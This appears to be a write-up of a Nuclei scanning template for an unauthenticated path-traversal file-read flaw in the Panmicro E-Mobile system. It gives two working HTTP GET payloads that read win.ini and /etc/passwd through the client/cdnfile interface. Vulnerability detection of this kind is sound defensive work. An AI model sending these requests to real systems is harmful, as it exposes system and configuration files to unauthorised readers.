# Nuclei Template: Panmicro E-Mobile System - Arbitrary File Read
**Template ID:** panmicro-arbitrary-file-read
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`panmicro-arbitrary-file-read.yaml`)

## Vulnerability Information & PoC

## Description
The Panmicro E-Mobile client/cdnfile interface has an arbitrary file reading vulnerability. Unauthenticated attackers can use this vulnerability to read important system files, database configuration files, and so on.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/client/cdnfile/1C/Windows/win.ini?windows
GET {{BaseURL}}/client/cdnfile/C/etc/passwd?linux
```

## References
- http://cn-sec.com/archives/3182931.html
- https://cn-sec.com/archives/3188605.html
